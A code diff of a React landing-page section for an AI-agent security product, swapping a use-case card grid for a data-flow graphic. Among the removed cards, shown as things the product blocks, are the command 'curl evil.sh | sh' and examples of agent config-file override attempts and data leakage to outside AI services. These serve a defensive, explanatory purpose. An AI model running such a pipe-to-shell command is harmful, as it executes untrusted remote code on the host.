@@ -1,100 +1,73 @@
-"use client";
-
 import Reveal from "@/components/landing/reveal";
-import ScrollRevealTitle from "@/components/ui/scroll-reveal-title";
+import SectionLabel from "@/components/landing/section-label";
+import { ArrowRight, FileText, MessageSquareText, Send, Wrench } from "lucide-react";
 
-interface UseCaseItem {
-  title: string;
-  body: string;
-  tagType: "blocked" | "logged" | "report";
-  tagContent: string;
-  commandContent: string;
-}
-
-const consolidatedCases: UseCaseItem[] = [
+const stages = [
   {
-    title: "Session Visibility & Oversight",
-    body: "See every prompt, session, MCP tool call, and action across browser, CLI, and desktop agents. Real-time and historical audit of all agent surfaces.",
-    tagType: "logged",
-    tagContent: "LOGGED",
-    commandContent: "session → 47 prompts, 12 files read",
+    icon: FileText,
+    label: "MCP response",
+    detail: "Sensitive HR data enters the session",
   },
   {
-    title: "Content Classification & Access Control",
-    body: "Classify every prompt, document, tool output, and context source before the agent can use it. Block agents from accessing legal, HR, finance, board materials, and source code.",
-    tagType: "blocked",
-    tagContent: "BLOCKED",
-    commandContent: "paste board memo → ChatGPT",
+    icon: MessageSquareText,
+    label: "Agent context",
+    detail: "The agent summarizes and transforms it",
   },
   {
-    title: "Action & Execution Guardrails",
-    body: "Risk-score and gate shell, git, package, network, cloud, and admin actions. Prevent unsafe downstream actions when suspicious or restricted context is in scope.",
-    tagType: "blocked",
-    tagContent: "BLOCKED",
-    commandContent: "curl evil.sh | sh",
+    icon: Wrench,
+    label: "Tool argument",
+    detail: "The information becomes part of a tool call",
   },
   {
-    title: "AI Attacks & Trust-surface Defense",
-    body: "Detect AI attacks in docs, images, PRs, issues, tool output, emails, and web content. Monitor CLAUDE.md, AGENTS.md, skills, hooks, and local trust files for malicious changes.",
-    tagType: "blocked",
-    tagContent: "BLOCKED",
-    commandContent: "CLAUDE.md → override attempt",
+    icon: Send,
+    label: "External action",
+    detail: "Policy stops the wrong destination",
   },
-  {
-    title: "Data Loss Prevention",
-    body: "Prevent sensitive data from leaving through agent-driven channels—not just email and web. Block classified code, credentials, PII, and internal data from reaching Slack, SaaS apps, or external LLMs.",
-    tagType: "blocked",
-    tagContent: "BLOCKED",
-    commandContent: "customer_list.csv → Perplexity",
-  },
-  {
-    title: "Audit & Compliance Reporting",
-    body: "Generate comprehensive audit trails and compliance reports that demonstrate agent governance in action. Meet SOC 2, ISO 27001, HIPAA, and regulatory requirements with one-click evidence.",
-    tagType: "report",
-    tagContent: "REPORT",
-    commandContent: "847 sessions audited, 100% compliant",
-  },
-];
+] as const;
 
 export default function UseCasesSection() {
   return (
-    <section id="use-cases" className="px-5 pb-20 pt-8 sm:pb-28 sm:pt-12">
+    <section id="why-godel" className="scroll-mt-24 border-y border-[#e5dff0] bg-white px-5 py-24 sm:px-6 sm:py-32">
       <div className="mx-auto max-w-[1180px]">
-        <ScrollRevealTitle text={"Runtime Security for Every AI Agent\nAcross Desktop, Browser, Terminal and Pipelines"} />
+        <Reveal className="max-w-[850px]">
+          <SectionLabel>The missing security context</SectionLabel>
+          <h2 className="mt-5 max-w-[820px] text-balance text-3xl font-semibold leading-[1.08] tracking-normal text-[#111322] sm:text-4xl lg:text-5xl">
+            Data becomes context. <span className="text-[#6d49fd]">Policy should follow.</span>
+          </h2>
+          <p className="mt-6 max-w-[760px] text-[15px] leading-7 text-[#625d6e] sm:text-base">
+            Sensitive information does not remain a file. Inside an AI workflow it becomes a prompt, an MCP response, a model output, a tool argument, and eventually an action. Gödel classifies that information as it moves and enforces how it may be processed, retained, shared, or allowed to influence what happens next.
+          </p>
+        </Reveal>
 
-        <div className="mt-8 grid grid-cols-1 gap-6 md:grid-cols-2 lg:grid-cols-3">
-          {consolidatedCases.map((item, index) => (
-            <Reveal key={item.title} delay={index * 0.05} className="h-full">
-              <div className="group flex h-full flex-col justify-between rounded-[24px] border border-[#e4def5] bg-white p-7 shadow-[0_1px_3px_rgba(17,19,34,.05),0_8px_24px_rgba(109,73,253,.06)] hover:-translate-y-1 hover:border-[#6d49fd]/30 hover:shadow-[0_20px_50px_rgba(45,20,110,.08)] transition-all duration-300">
-                <div>
-                  <h3 className="text-lg font-bold tracking-[-0.025em] text-[#111322] mb-3 mt-1">
-                    {item.title}
-                  </h3>
-                  <p className="text-sm text-[#54586f] leading-relaxed mb-6">
-                    {item.body}
-                  </p>
-                </div>
-
-                <div className={`flex items-center gap-2.5 rounded-[10px] border px-3.5 py-2.5 font-mono text-[12px] truncate ${item.tagType === "logged"
-                  ? "bg-[#f4faf6] border-[#d5edd9] text-[#247c40]"
-                  : item.tagType === "report"
-                    ? "bg-[#f4f3ff] border-[#e4def5] text-[#5e32ff]"
-                    : "bg-[#fff5f5] border-[#f3d0d0] text-[#a83232]"
-                  }`}>
-                  <span className={`inline-block font-bold text-[9px] uppercase tracking-wider px-1.5 py-0.5 rounded ${item.tagType === "logged"
-                    ? "bg-green-100 text-green-800"
-                    : item.tagType === "report"
-                      ? "bg-[#e4dfff] text-[#5e32ff]"
-                      : "bg-red-100 text-red-800"
-                    }`}>
-                    {item.tagContent}
+        <div className="mt-14 grid gap-4 lg:grid-cols-[1fr_auto_1fr_auto_1fr_auto_1fr] lg:items-start">
+          {stages.map((stage, index) => (
+            <div key={stage.label} className="contents">
+              <Reveal delay={index * 0.06} className="border-t border-[#dcd4ec] pt-5">
+                <div className="flex items-start gap-4">
+                  <span className="grid h-10 w-10 shrink-0 place-items-center rounded-[10px] bg-[#eee9ff] text-[#6d49fd]">
+                    <stage.icon className="h-4.5 w-4.5" />
                   </span>
-                  <span className="truncate">{item.commandContent}</span>
+                  <div>
+                    <p className="text-[11px] font-bold uppercase tracking-[0.12em] text-[#6d49fd]">0{index + 1}</p>
+                    <h3 className="mt-2 text-base font-semibold tracking-normal text-[#1c1825]">{stage.label}</h3>
+                    <p className="mt-2 text-sm leading-6 text-[#706a7a]">{stage.detail}</p>
+                  </div>
                 </div>
-              </div>
-            </Reveal>
+              </Reveal>
+              {index < stages.length - 1 && (
+                <ArrowRight className="mx-auto hidden h-5 w-5 text-[#b2a6d5] lg:mt-8 lg:block" aria-hidden="true" />
+              )}
+            </div>
           ))}
         </div>
+
+        <Reveal className="mt-12 border-l-4 border-[#6d49fd] bg-[#f5f2ff] px-6 py-5 sm:flex sm:items-center sm:justify-between sm:gap-8 sm:px-8">
+          <div>
+            <p className="text-[10px] font-bold uppercase tracking-[0.16em] text-[#6d49fd]">Handling requirements that persist</p>
+            <p className="mt-2 text-sm font-semibold text-[#24202d] sm:text-base">Restricted · Internal only · No external output · No memory persistence</p>
+          </div>
+          <p className="mt-3 text-sm text-[#696273] sm:mt-0 sm:max-w-[310px] sm:text-right">The format changes. The protection does not.</p>
+        </Reveal>
       </div>
     </section>
   );
